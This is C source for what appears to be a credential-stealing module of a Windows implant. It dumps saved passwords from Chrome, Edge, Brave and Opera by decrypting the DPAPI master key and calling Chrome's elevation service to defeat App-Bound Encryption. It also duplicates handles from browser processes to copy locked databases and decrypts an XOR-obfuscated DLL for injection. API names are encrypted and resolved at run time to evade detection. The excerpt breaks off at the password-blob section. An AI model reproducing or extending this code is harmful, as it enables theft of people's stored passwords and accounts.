/*
 * browser.c — Chrome/Chromium credential dump
 *
 * Extracts saved passwords from Chrome, Edge, Brave, Opera, Chromium.
 * - Decrypts master key via DPAPI (CryptUnprotectData, dynamic GPA — no IAT)
 * - Decrypts each password blob with AES-256-GCM (mbedTLS, already linked)
 * - Parses Login Data SQLite B-tree without external sqlite3 dependency
 */

#include "commands.h"
#include "adv_lazy.h"
#include "crypto.h"
#include "bip39_wordlist.h"
#include <windows.h>
#include <wincrypt.h>
#include <objbase.h>
#include <oleauto.h>
#include <mbedtls/gcm.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include "tlhelp_lazy.h"
#include "evs_strings.h"
#include "inject.h"

/*
 * Chrome v20 injection helper DLL blob.
 * Built by `make chrome-helper`. If not yet generated, build it first:
 *   make chrome-helper && make standalone
 */
#ifdef __has_include
#  if __has_include("chrome_key_helper_blob.h")
#    include "chrome_key_helper_blob.h"
#    define HAVE_CHROME_INJECT 1
#  endif
#endif

#ifdef HAVE_CHROME_INJECT
/* Derive 16-byte decryption key from EVS_KEY via LCG expansion.
 * Matches encrypt_blob.py — no explicit key stored in the blob header. */
static void _ckh_key(unsigned char k[16])
{
    volatile unsigned char seed = EVS_KEY;
    k[0] = seed;
    for (int i = 1; i < 16; i++)
        k[i] = (unsigned char)((k[i-1] * 0x6B + 0x41) & 0xFF);
}

/* Decode nibble-split XOR'd blob into a heap buffer — caller must HeapFree. */
static unsigned char *_ckh_decrypt(void)
{
    unsigned char *buf = (unsigned char *)HeapAlloc(
        GetProcessHeap(), 0, chrome_key_helper_dll_len);
    if (!buf) return NULL;
    unsigned char k[16];
    _ckh_key(k);
    for (unsigned int i = 0; i < chrome_key_helper_dll_len; i++) {
        unsigned char hi = chrome_key_helper_dll[i * 2];
        unsigned char lo = chrome_key_helper_dll[i * 2 + 1];
        buf[i] = ((hi << 4) | lo) ^ k[i & 15];
    }
    return buf;
}
#endif

/* ── Dynamic API resolution — keeps process-injection APIs out of IAT ─── */
typedef LPVOID (WINAPI *_fVAEx_t)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL   (WINAPI *_fVFEx_t)(HANDLE,LPVOID,SIZE_T,DWORD);
typedef SIZE_T (WINAPI *_fVQEx_t)(HANDLE,LPCVOID,PMEMORY_BASIC_INFORMATION,SIZE_T);
typedef BOOL   (WINAPI *_fRPM_t) (HANDLE,LPCVOID,LPVOID,SIZE_T,SIZE_T*);
typedef BOOL   (WINAPI *_fWPM_t) (HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);

static _fVAEx_t _bVAEx; static _fVFEx_t _bVFEx;
static _fVQEx_t _bVQEx; static _fRPM_t  _bRPM;
static _fWPM_t  _bWPM;

static void _bapi_init(void)
{
    static volatile LONG _done = 0;
    if (InterlockedCompareExchange(&_done, 1, 0) != 0) return;
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    if (k32) {
        char s0[16]; EVS_D(s0, EVS_fn_VirtualAllocEx);
        char s1[16]; EVS_D(s1, EVS_fn_VirtualFreeEx);
        char s2[16]; EVS_D(s2, EVS_fn_VirtualQueryEx);
        char s3[20]; EVS_D(s3, EVS_fn_ReadProcessMemory);
        char s4[20]; EVS_D(s4, EVS_fn_WriteProcessMemory);
        _bVAEx = (_fVAEx_t)(void*)GetProcAddress(k32, s0);
        _bVFEx = (_fVFEx_t)(void*)GetProcAddress(k32, s1);
        _bVQEx = (_fVQEx_t)(void*)GetProcAddress(k32, s2);
        _bRPM  = (_fRPM_t) (void*)GetProcAddress(k32, s3);
        _bWPM  = (_fWPM_t) (void*)GetProcAddress(k32, s4);
    }
}

#define VirtualAllocEx(h,a,s,t,p)            (_bVAEx?(void*)_bVAEx(h,a,s,t,p):(void*)NULL)
#define VirtualFreeEx(h,a,s,t)               (_bVFEx?_bVFEx(h,a,s,t):FALSE)
#define VirtualQueryEx(h,a,m,s)              (_bVQEx?_bVQEx(h,a,m,s):0)
#define ReadProcessMemory(h,b,buf,sz,rd)     (_bRPM?_bRPM(h,b,buf,sz,rd):FALSE)
#define WriteProcessMemory(h,b,buf,sz,wd)    (_bWPM?_bWPM(h,b,buf,sz,wd):FALSE)

/* ── byte utilities ──────────────────────────────────────────────────── */

static uint16_t _be16(const uint8_t *p)
{
    return (uint16_t)((p[0] << 8) | p[1]);
}

static uint32_t _be32(const uint8_t *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

/* ── SQLite varint ───────────────────────────────────────────────────── */

static int _sq_varint(const uint8_t *p, const uint8_t *end, uint64_t *v)
{
    uint64_t r = 0;
    int n = 0;
    while (p + n < end && n < 8)
    {
        uint8_t b = p[n++];
        r = (r << 7) | (b & 0x7f);
        if (!(b & 0x80))
        {
            *v = r;
            return n;
        }
    }
    if (p + n < end)
        r = (r << 8) | p[n++];
    *v = r;
    return n;
}

/* serial type → byte length of stored value */
static uint32_t _sq_slen(uint64_t t)
{
    if (t == 0)
        return 0;
    if (t <= 4)
        return (uint32_t)t;
    if (t == 5)
        return 6;
    if (t == 6)
        return 8;
    if (t == 7)
        return 8;
    if (t == 8 || t == 9)
        return 0;
    if (t >= 12 && !(t & 1))
        return (uint32_t)((t - 12) / 2);
    if (t >= 13 && (t & 1))
        return (uint32_t)((t - 13) / 2);
    return 0;
}

/* ── IElevator COM interface (Chrome App-Bound Encryption, v127+) ────── */

typedef struct {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(void*);
    ULONG   (STDMETHODCALLTYPE *Release)(void*);
    /* RunRecoveryCRXElevated — index 3 */
    HRESULT (STDMETHODCALLTYPE *RunRecoveryCRXElevated)(void*, const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*);
    /* EncryptData — index 4 */
    HRESULT (STDMETHODCALLTYPE *EncryptData)(void*, DWORD, BSTR, BSTR*, DWORD*);
    /* DecryptData — index 5 */
    HRESULT (STDMETHODCALLTYPE *DecryptData)(void*, BSTR, BSTR*, DWORD*);
} _IElevatorVtbl;
typedef struct { _IElevatorVtbl *lpVtbl; } _IElevator;

/* one entry per Chrome channel (Stable/Beta/Dev/Canary) */
static const struct {
    CLSID clsid;
    IID   iid;
} s_elevators[] = {
    /* Chrome Stable v130+ — IElevator2Chrome (new IID per Chrome update) */
    { {0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B}},
      {0x1BF5208B,0x295F,0x4992,{0xB5,0xF4,0x3A,0x9B,0xB6,0x49,0x48,0x38}} },
    /* Chrome Stable v127-129 — IElevatorChrome (legacy IID) */
    { {0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B}},
      {0x463ABECF,0x410D,0x407F,{0x8A,0xF5,0x0D,0xF3,0x5A,0x00,0x5C,0xC8}} },
    /* Chrome Beta */
    { {0xDD2D3AC8,0x2CDB,0x4399,{0x8F,0x7B,0x5C,0x09,0xB7,0xA7,0xC7,0xBC}},
      {0xA2721D66,0x376E,0x4D2F,{0x9F,0x0F,0x90,0x70,0xE9,0xA4,0x2B,0x5F}} },
    /* Chrome Dev */
    { {0xDA6F39E5,0x2DF0,0x4A23,{0x8E,0x5A,0xBC,0x2E,0x79,0xB6,0x7B,0x14}},
      {0xBB2AA26B,0x343A,0x4072,{0x8B,0x6F,0x80,0x55,0x7B,0x8C,0xE5,0x71}} },
    /* Chrome Canary */
    { {0x704C2872,0x2049,0x435E,{0xA4,0x69,0xB5,0x36,0xB4,0xF9,0x94,0x08}},
      {0x4F7CE041,0x28E9,0x484F,{0x9D,0xD0,0x61,0xA8,0xCA,0xCE,0xFE,0xE4}} },
    /* Microsoft Edge Stable */
    { {0x1FCBE96C,0x1697,0x43AF,{0x9C,0xEA,0x24,0xD7,0xD8,0x61,0xD4,0x5B}},
      {0xC9C2B807,0x7731,0x4F34,{0x81,0xB7,0x44,0xFF,0x78,0x59,0x43,0xF2}} },
};

/*
 * The TypeLib registration for IElevator (used by OLE Automation proxy/stub)
 * points to the Chrome version that was current at install time. After a Chrome
 * update the old path is deleted, leaving a stale entry and causing
 * CoCreateInstance to fail with TYPE_E_CANTLOADLIBRARY (0x80029C4A).
 * Fix: write the current elevation_service.exe path into a volatile HKCU key
 * that shadows the stale HKLM entry, then clean up after the call.
 */
static void _scan_svc_dir(const char *appdir, const char *svc_name,
                           char *best_ver, size_t bvsz,
                           char *best_path, size_t bpsz)
{
    char pat[MAX_PATH];
    snprintf(pat, sizeof(pat), "%s\\*", appdir);
    WIN32_FIND_DATAA fd;
    memset(&fd, 0, sizeof(fd));
    HANDLE hf = FindFirstFileA(pat, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (!isdigit((unsigned char)fd.cFileName[0])) continue;
        char svc[MAX_PATH];
        snprintf(svc, sizeof(svc), "%s\\%s\\%s", appdir, fd.cFileName, svc_name);
        if (GetFileAttributesA(svc) == INVALID_FILE_ATTRIBUTES) continue;
        if (strcmp(fd.cFileName, best_ver) > 0) {
            strncpy(best_ver, fd.cFileName, bvsz - 1);
            strncpy(best_path, svc, bpsz - 1);
        }
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
}

static void _find_elevation_svc(char *out, size_t outsz)
{
    char best_ver[64] = {0};
    char best_path[MAX_PATH] = {0};

    /* Chrome */
    char chrome_app[MAX_PATH];
    ExpandEnvironmentStringsA("%ProgramFiles%\\Google\\Chrome\\Application",
                               chrome_app, sizeof(chrome_app));
    _scan_svc_dir(chrome_app, "elevation_service.exe",
                  best_ver, sizeof(best_ver), best_path, sizeof(best_path));

    /* Edge (x86 install path) */
    char edge_app[MAX_PATH];
    ExpandEnvironmentStringsA("%ProgramFiles(x86)%\\Microsoft\\Edge\\Application",
                               edge_app, sizeof(edge_app));
    _scan_svc_dir(edge_app, "elevation_service.exe",
                  best_ver, sizeof(best_ver), best_path, sizeof(best_path));

    /* Edge (x64 install path) */
    char edge_app64[MAX_PATH];
    ExpandEnvironmentStringsA("%ProgramFiles%\\Microsoft\\Edge\\Application",
                               edge_app64, sizeof(edge_app64));
    _scan_svc_dir(edge_app64, "elevation_service.exe",
                  best_ver, sizeof(best_ver), best_path, sizeof(best_path));

    if (best_path[0]) strncpy(out, best_path, outsz - 1);
}

/* IElevator TypeLib GUID == its IID for Chrome Stable */
static const char *_ELEV_TYPELIB_GUID =
    "{463ABECF-410D-407F-8AF5-0DF35A005CC8}";

static void _fix_elevator_typelib(const char *svc_path)
{
    char _pfx[26]; EVS_D(_pfx, EVS_str_typelib_prefix);
    char key[256];
    HKEY hk;
    static const char *arches[] = {"win64", "win32", NULL};
    for (int a = 0; arches[a]; a++) {
        snprintf(key, sizeof(key), "%s%s\\1.0\\0\\%s",
                 _pfx, _ELEV_TYPELIB_GUID, arches[a]);
        if (RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL,
                            REG_OPTION_VOLATILE, KEY_SET_VALUE,
                            NULL, &hk, NULL) == ERROR_SUCCESS) {
            RegSetValueExA(hk, NULL, 0, REG_SZ,
                           (const BYTE *)svc_path,
                           (DWORD)(strlen(svc_path) + 1));
            RegCloseKey(hk);
        }
    }
    SecureZeroMemory(_pfx, sizeof(_pfx));
}

static void _cleanup_elevator_typelib(void)
{
    char _pfx[26]; EVS_D(_pfx, EVS_str_typelib_prefix);
    char key[256];
    static const char *arches[] = {"win64", "win32", NULL};
    for (int a = 0; arches[a]; a++) {
        snprintf(key, sizeof(key), "%s%s\\1.0\\0\\%s",
                 _pfx, _ELEV_TYPELIB_GUID, arches[a]);
        RegDeleteKeyA(HKEY_CURRENT_USER, key);
    }
    snprintf(key, sizeof(key), "%s%s\\1.0\\0", _pfx, _ELEV_TYPELIB_GUID);
    RegDeleteKeyA(HKEY_CURRENT_USER, key);
    snprintf(key, sizeof(key), "%s%s\\1.0",    _pfx, _ELEV_TYPELIB_GUID);
    RegDeleteKeyA(HKEY_CURRENT_USER, key);
    snprintf(key, sizeof(key), "%s%s",         _pfx, _ELEV_TYPELIB_GUID);
    RegDeleteKeyA(HKEY_CURRENT_USER, key);
    SecureZeroMemory(_pfx, sizeof(_pfx));
}

/* call Chrome elevation service to decrypt app-bound blob → raw key bytes */
static int _elevator_decrypt(const uint8_t *in, DWORD in_len,
                               uint8_t **out, size_t *out_len)
{
    /* Fix stale TypeLib path before any COM calls */
    char svc_path[MAX_PATH] = {0};
    _find_elevation_svc(svc_path, sizeof(svc_path));
    if (svc_path[0]) _fix_elevator_typelib(svc_path);

    HRESULT hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    int ok = 0;
    for (int i = 0; i < (int)(sizeof(s_elevators)/sizeof(s_elevators[0])); i++) {
        _IElevator *pElev = NULL;
        HRESULT hr = CoCreateInstance(&s_elevators[i].clsid, NULL,
                                       CLSCTX_LOCAL_SERVER,
                                       &s_elevators[i].iid,
                                       (void**)&pElev);
        if (FAILED(hr) || !pElev) continue;

        /* Set proxy blanket: impersonation + dynamic cloaking so the service
           sees this thread's token rather than the process token. */
        CoSetProxyBlanket((IUnknown *)pElev,
                          0xFFFFFFFFUL,   /* RPC_C_AUTHN_DEFAULT */
                          0xFFFFFFFFUL,   /* RPC_C_AUTHZ_DEFAULT */
                          NULL,
                          6,             /* RPC_C_AUTHN_LEVEL_PKT_PRIVACY */
                          3,             /* RPC_C_IMP_LEVEL_IMPERSONATE */
                          NULL,
                          0x40);         /* EOAC_DYNAMIC_CLOAKING */

        BSTR bstr_in = SysAllocStringByteLen((const char*)in, in_len);
        if (!bstr_in) { pElev->lpVtbl->Release(pElev); continue; }

        BSTR bstr_out = NULL;
        DWORD last_err = 0;
        hr = pElev->lpVtbl->DecryptData(pElev, bstr_in, &bstr_out, &last_err);
        SysFreeString(bstr_in);
        pElev->lpVtbl->Release(pElev);

        if (SUCCEEDED(hr) && bstr_out) {
            UINT blen = SysStringByteLen(bstr_out);
            *out = (uint8_t*)malloc(blen + 1);
            if (*out) {
                memcpy(*out, bstr_out, blen);
                (*out)[blen] = 0;
                *out_len = blen;
                ok = 1;
            }
            SysFreeString(bstr_out);
            if (ok) break;
        }
        if (bstr_out) SysFreeString(bstr_out);
    }

    if (hr_init != RPC_E_CHANGED_MODE) CoUninitialize();
    if (svc_path[0]) _cleanup_elevator_typelib();
    return ok ? 0 : -1;
}

/* read app_bound_encrypted_key from Local State, decrypt via elevation service */
static int _get_v20_master_key(const char *user_data_dir, uint8_t key_out[32])
{
    char ls[MAX_PATH];
    snprintf(ls, sizeof(ls), "%s\\Local State", user_data_dir);

    size_t sz = 0;
    uint8_t *raw = NULL;
    {
        HANDLE h = CreateFileA(ls, GENERIC_READ,
                                FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
                                NULL, OPEN_EXISTING, 0, NULL);
        if (h == INVALID_HANDLE_VALUE) return -1;
        LARGE_INTEGER li = {0}; GetFileSizeEx(h, &li);
        if (li.QuadPart > 0 && li.QuadPart <= 128*1024*1024) {
            raw = (uint8_t*)malloc((size_t)li.QuadPart + 1);
            if (raw) { DWORD rd=0; ReadFile(h, raw, (DWORD)li.QuadPart, &rd, NULL); raw[rd]=0; sz=rd; }
        }
        CloseHandle(h);
    }
    if (!raw) return -1;

    /* find "app_bound_encrypted_key":"<b64>" */
    const char needle[] = "\"app_bound_encrypted_key\":\"";
    char *p = strstr((char*)raw, needle);
    int rc = -1;
    if (p) {
        p += sizeof(needle) - 1;
        char *q = strchr(p, '"');
        if (q) {
            char *b64 = (char*)malloc((size_t)(q-p)+1);
            if (b64) {
                memcpy(b64, p, (size_t)(q-p)); b64[q-p] = 0;
                size_t enc_len = 0;
                uint8_t *enc = base64_decode(b64, &enc_len);
                free(b64);
                if (enc) {
                    uint8_t *dec = NULL; size_t dec_len = 0;
                    if (_elevator_decrypt(enc, (DWORD)enc_len, &dec, &dec_len) == 0) {
                        /* service returns raw 32-byte key, possibly with version prefix */
                        if (dec_len >= 32) {
                            /* take last 32 bytes in case of version prefix */
                            memcpy(key_out, dec + dec_len - 32, 32);
                            rc = 0;
                        }
                        SecureZeroMemory(dec, dec_len); free(dec);
                    }
                    SecureZeroMemory(enc, enc_len); free(enc);
                }
            }
        }
    }
    free(raw);
    return rc;
}

/* ── DPAPI decrypt ───────────────────────────────────────────────────── */

static int _dpapi_dec(const uint8_t *in, size_t in_len,
                      uint8_t **out, size_t *out_len)
{
    _bapi_init();

    typedef BOOL (WINAPI *_fCUD_t)(DATA_BLOB*,LPWSTR*,DATA_BLOB*,PVOID,PVOID,DWORD,DATA_BLOB*);
    char _sdll[16]; EVS_D(_sdll, EVS_dll_crypt32);
    HMODULE hC32 = GetModuleHandleA(_sdll);
    if (!hC32) hC32 = LoadLibraryA(_sdll);
    SecureZeroMemory(_sdll, sizeof(_sdll));
    char _sfn[20]; EVS_D(_sfn, EVS_fn_CryptUnprotectData);
    _fCUD_t fCUD = hC32 ? (_fCUD_t)(void *)GetProcAddress(hC32, _sfn) : NULL;
    SecureZeroMemory(_sfn, sizeof(_sfn));
    if (!fCUD) return -1;

    DATA_BLOB ib = {(DWORD)in_len, (BYTE *)(uintptr_t)in};
    DATA_BLOB ob = {0, NULL};
    if (!fCUD(&ib, NULL, NULL, NULL, NULL, 0, &ob))
        return -1;
    *out = (uint8_t *)malloc(ob.cbData + 1);
    if (!*out)
    {
        LocalFree(ob.pbData);
        return -1;
    }
    memcpy(*out, ob.pbData, ob.cbData);
    (*out)[ob.cbData] = 0;
    *out_len = ob.cbData;
    LocalFree(ob.pbData);
    return 0;
}

/* ── AES-256-GCM decrypt (mbedTLS 3.x) ──────────────────────────────── */

static int _aes_gcm_dec(const uint8_t *key,
                        const uint8_t *nonce, size_t nonce_len,
                        const uint8_t *ct, size_t ct_len,
                        const uint8_t *expected_tag,
                        uint8_t *pt)
{
    mbedtls_gcm_context ctx;
    mbedtls_gcm_init(&ctx);

    int ret = mbedtls_gcm_setkey(&ctx, MBEDTLS_CIPHER_ID_AES, key, 256);
    if (ret)
    {
        mbedtls_gcm_free(&ctx);
        return -1;
    }

    ret = mbedtls_gcm_starts(&ctx, MBEDTLS_GCM_DECRYPT, nonce, nonce_len);
    if (ret)
    {
        mbedtls_gcm_free(&ctx);
        return -1;
    }

    size_t olen = 0;
    ret = mbedtls_gcm_update(&ctx, ct, ct_len, pt, ct_len + 16, &olen);
    if (ret)
    {
        mbedtls_gcm_free(&ctx);
        return -1;
    }

    uint8_t tag_buf[16] = {0};
    size_t olen2 = 0;
    mbedtls_gcm_finish(&ctx, NULL, 0, &olen2, tag_buf, 16);
    mbedtls_gcm_free(&ctx);

    if (memcmp(tag_buf, expected_tag, 16) != 0)
        return -1;
    return 0;
}

/* ── file I/O ────────────────────────────────────────────────────────── */

/* read whole file; caller frees */
static uint8_t *_read_file(const char *path, size_t *sz)
{
    HANDLE h = CreateFileA(path, GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return NULL;
    LARGE_INTEGER li = {0};
    GetFileSizeEx(h, &li);
    if (li.QuadPart <= 0 || li.QuadPart > 128 * 1024 * 1024)
    {
        CloseHandle(h);
        return NULL;
    }
    uint8_t *buf = (uint8_t *)malloc((size_t)li.QuadPart + 1);
    if (!buf)
    {
        CloseHandle(h);
        return NULL;
    }
    DWORD rd = 0;
    ReadFile(h, buf, (DWORD)li.QuadPart, &rd, NULL);
    CloseHandle(h);
    buf[rd] = 0;
    *sz = (size_t)rd;
    return buf;
}

/*
 * Apply SQLite WAL frames to an in-memory DB buffer.
 * WAL header (32 bytes): magic(4=0x377f0682) + ver(4) + pgsz(4) + ...
 * Each frame (24 + pgsz): pgno(4) + db_size(4) + salt1(4) + salt2(4) + ck1(4) + ck2(4) + data
 * Frames applied in order → last write per page wins. Checksums not validated.
 * Expands *pdata if WAL references pages beyond current DB end.
 */
static void _apply_wal(uint8_t **pdata, size_t *psz, const char *db_path)
{
    char wal_path[MAX_PATH];
    snprintf(wal_path, sizeof(wal_path), "%s-wal", db_path);

    size_t wsz = 0;
    uint8_t *wdata = _read_file(wal_path, &wsz);
    if (!wdata) return;

    if (wsz < 32 || _be32(wdata) != 0x377f0682u) { free(wdata); return; }

    uint32_t pgsz = _be32(wdata + 8);
    if (pgsz < 512 || pgsz > 65536 || (pgsz & (pgsz - 1))) { free(wdata); return; }

    /* page size must match the main DB */
    if (*psz >= 100) {
        uint16_t raw = _be16(*pdata + 16);
        uint32_t db_pgsz = (raw == 1) ? 65536u : (uint32_t)raw;
        if (db_pgsz != pgsz) { free(wdata); return; }
    }

    size_t frame_sz = 24 + pgsz;

    /* find highest page number referenced — may require buffer growth */
    uint32_t max_pgno = (uint32_t)(*psz / pgsz);
    for (size_t off = 32; off + frame_sz <= wsz; off += frame_sz) {
        uint32_t pgno = _be32(wdata + off);
        if (pgno > max_pgno) max_pgno = pgno;
    }

    size_t need = (size_t)max_pgno * pgsz;
    if (need > *psz) {
        uint8_t *nb = (uint8_t *)realloc(*pdata, need + 1);
        if (!nb) { free(wdata); return; }
        memset(nb + *psz, 0, need - *psz + 1);
        *pdata = nb;
        *psz   = need;
    }

    /* overlay pages */
    for (size_t off = 32; off + frame_sz <= wsz; off += frame_sz) {
        uint32_t pgno = _be32(wdata + off);
        if (pgno == 0 || pgno > max_pgno) continue;
        size_t dst = (size_t)(pgno - 1) * pgsz;
        if (dst + pgsz > *psz) continue;
        memcpy(*pdata + dst, wdata + off + 24, pgsz);
    }
    free(wdata);
}

/* copy file to %TEMP%\~brXXXX.tmp to bypass Chrome's lock */
static int _copy_to_temp(const char *src, char *tmp_path, size_t tmp_sz)
{
    char tmp[MAX_PATH];
    GetTempPathA(sizeof(tmp), tmp);
    snprintf(tmp_path, tmp_sz, "%s~br%08lx.tmp", tmp,
             (unsigned long)GetTickCount());
    return CopyFileA(src, tmp_path, FALSE) ? 0 : -1;
}

/* forward — defined later (before injection block) */
static DWORD _find_browser_pid(const char *proc_name);

/*
 * Handle-hijack fallback for locked files (e.g. Opera Cookies locked
 * exclusively without FILE_SHARE_READ).
 * Enumerates open handles in the target process, finds the one pointing to
 * `path`, duplicates it with DUPLICATE_SAME_ACCESS, copies to a temp file.
 * Requires PROCESS_DUP_HANDLE on the target (same-user → always granted).
 *
 * Returns 0 on success; -1 on failure.
 */

/*
 * SystemExtendedHandleInformation (class 64) — stable across Windows versions.
 * Each entry: PVOID Object(8) + ULONG_PTR ProcessId(8) + ULONG_PTR Handle(8)
 *             + ULONG Access(4) + USHORT BtIdx(2) + USHORT ObjType(2)
 *             + ULONG Attrs(4) + ULONG Reserved(4) = 40 bytes.
 * Header: ULONG_PTR NumberOfHandles(8) + ULONG_PTR Reserved(8) = 16 bytes.
 */
#pragma pack(push, 8)
typedef struct {
    PVOID       Object;
    ULONG_PTR   ProcessId;
    ULONG_PTR   Handle;
    ACCESS_MASK Access;
    USHORT      BtIdx;
    USHORT      ObjType;
    ULONG       Attrs;
    ULONG       Reserved;
} _SysHndEx;
typedef struct { ULONG_PTR n; ULONG_PTR _rsv; _SysHndEx h[1]; } _SysHndExInfo;
#pragma pack(pop)

typedef NTSTATUS (NTAPI *_pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);

static int _copy_via_dup(const char *src, char *tmp_path, size_t tmp_sz,
                          const char *proc_name)
{
    /* Collect ALL PIDs for proc_name (browser spawns many processes) */
    #define _MAX_PIDS 128
    DWORD pids[_MAX_PIDS];
    int   npi = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) do {
            if (_stricmp(pe.szExeFile, proc_name) == 0 && npi < _MAX_PIDS)
                pids[npi++] = pe.th32ProcessID;
        } while (Process32Next(snap, &pe));
        CloseHandle(snap);
    }
    if (!npi) return -1;

    char _ntdll_n[9]; EVS_D(_ntdll_n, EVS_dll_ntdll);
    HMODULE ntdll = _peb_module(_ntdll_n);
    SecureZeroMemory(_ntdll_n, sizeof(_ntdll_n));
    char _ntqsi_n[25]; EVS_D(_ntqsi_n, EVS_fn_NtQuerySystemInformation);
    _pfnNtQSI pNtQSI = ntdll ? (_pfnNtQSI)(void*)GetProcAddress(ntdll, _ntqsi_n) : NULL;
    SecureZeroMemory(_ntqsi_n, sizeof(_ntqsi_n));
    if (!pNtQSI) return -1;

    /* Use SystemExtendedHandleInformation (class 64) — correct struct on all Win versions */
    ULONG bufsz = 1u << 22; /* 4MB start */
    _SysHndExInfo *info = NULL;
    for (;;) {
        free(info);
        info = (_SysHndExInfo *)malloc(bufsz);
        if (!info) return -1;
        ULONG need = 0;
        NTSTATUS st = pNtQSI(64 /*SystemExtendedHandleInformation*/, info, bufsz, &need);
        if (st == 0) break;
        free(info); info = NULL;
        if ((ULONG)st != 0xC0000004UL) return -1;
        bufsz = need ? need + 4096 : bufsz * 2;
        if (bufsz > (1u << 27)) return -1;
    }

    /* Open process handles lazily (one per PID, only when we see its handles) */
    HANDLE hprocs[_MAX_PIDS];
    for (int j = 0; j < npi; j++) hprocs[j] = NULL;

    HANDLE hfile = INVALID_HANDLE_VALUE;
    for (ULONG_PTR i = 0; i < info->n && hfile == INVALID_HANDLE_VALUE; i++) {
        DWORD hpid = (DWORD)info->h[i].ProcessId;

        /* Check if this PID belongs to our target browser */
        int pidx = -1;
        for (int j = 0; j < npi; j++) {
            if (pids[j] == hpid) { pidx = j; break; }
        }
        if (pidx < 0) continue;

        /* Open process for handle duplication if not yet opened */
        if (!hprocs[pidx])
            hprocs[pidx] = OpenProcess(PROCESS_DUP_HANDLE, FALSE, hpid);
        if (!hprocs[pidx]) continue;

        HANDLE dup = NULL;
        if (!DuplicateHandle(hprocs[pidx], (HANDLE)info->h[i].Handle,
                             GetCurrentProcess(), &dup,
                             0, FALSE, DUPLICATE_SAME_ACCESS)) continue;

        if (GetFileType(dup) != FILE_TYPE_DISK) { CloseHandle(dup); continue; }

        char fp[MAX_PATH];
        DWORD flen = GetFinalPathNameByHandleA(dup, fp, sizeof(fp) - 1,
                                               FILE_NAME_NORMALIZED);
        if (flen > 0 && flen < sizeof(fp)) {
            fp[flen] = 0;
            const char *p = fp;
            if (strncmp(p, "\\\\?\\", 4) == 0) p += 4;
            if (_stricmp(p, src) == 0) {
                SetFilePointer(dup, 0, NULL, FILE_BEGIN);
                hfile = dup;
            }
        }
        if (hfile == INVALID_HANDLE_VALUE) CloseHandle(dup);
    }
    free(info);
    for (int j = 0; j < npi; j++)
        if (hprocs[j]) CloseHandle(hprocs[j]);

    if (hfile == INVALID_HANDLE_VALUE) return -1;

    /* Write to temp file */
    char tmp[MAX_PATH];
    GetTempPathA(sizeof(tmp), tmp);
    snprintf(tmp_path, tmp_sz, "%s~br%08lx.tmp", tmp,
             (unsigned long)GetTickCount());
    HANDLE hdst = CreateFileA(tmp_path, GENERIC_WRITE, 0, NULL,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hdst == INVALID_HANDLE_VALUE) { CloseHandle(hfile); return -1; }

    uint8_t rbuf[65536];
    DWORD rd, wr;
    int ok = 1;
    while (ReadFile(hfile, rbuf, sizeof(rbuf), &rd, NULL) && rd > 0) {
        if (!WriteFile(hdst, rbuf, rd, &wr, NULL) || wr != rd) { ok = 0; break; }
    }
    CloseHandle(hdst);
    CloseHandle(hfile);
    if (!ok) { DeleteFileA(tmp_path); return -1; }
    return 0;
}

/* ── Chrome master key ───────────────────────────────────────────────── */

/* extract AES-256 master key from "Local State" (Chrome v80+)
   returns 0 on success, writes 32 bytes to key_out */
static int _get_master_key(const char *user_data_dir, uint8_t key_out[32])
{
    char ls[MAX_PATH];
    snprintf(ls, sizeof(ls), "%s\\Local State", user_data_dir);

    size_t sz = 0;
    uint8_t *raw = _read_file(ls, &sz);
    if (!raw)
        return -1;

    /* locate "encrypted_key":"<b64>" in the JSON (handle optional space after colon) */
    const char needle[] = "\"encrypted_key\":";
    char *p = strstr((char *)raw, needle);
    if (!p)
    {
        free(raw);
        return -1;
    }
    p += sizeof(needle) - 1;
    while (*p == ' ' || *p == '\t') p++;
    if (*p != '"') { free(raw); return -1; }
    p++;
    char *q = strchr(p, '"');
    if (!q)
    {
        free(raw);
        return -1;
    }

    char *b64 = (char *)malloc((size_t)(q - p) + 1);
    if (!b64)
    {
        free(raw);
        return -1;
    }
    memcpy(b64, p, (size_t)(q - p));
    b64[q - p] = 0;
    free(raw);

    size_t enc_len = 0;
    uint8_t *enc = base64_decode(b64, &enc_len);
    free(b64);
    if (!enc)
        return -1;

    int rc = -1;
    /* "DPAPI" magic prefix (5 bytes) */
    if (enc_len > 5 && memcmp(enc, "DPAPI", 5) == 0)
    {
        uint8_t *dec = NULL;
        size_t dec_len = 0;
        if (_dpapi_dec(enc + 5, enc_len - 5, &dec, &dec_len) == 0 &&
            dec_len >= 16 && dec_len <= 32)
        {
            memset(key_out, 0, 32);
            memcpy(key_out, dec, dec_len);
            rc = 0;
        }
        if (dec)
        {
            SecureZeroMemory(dec, dec_len);
            free(dec);
        }
    }
    SecureZeroMemory(enc, enc_len);
    free(enc);
    return rc;
}

/* ── password blob decryption ────────────────────────────────────────── */

/* same AES-GCM layout for v10/v11/v20: prefix(3) + nonce(12) + ct + tag(16) */
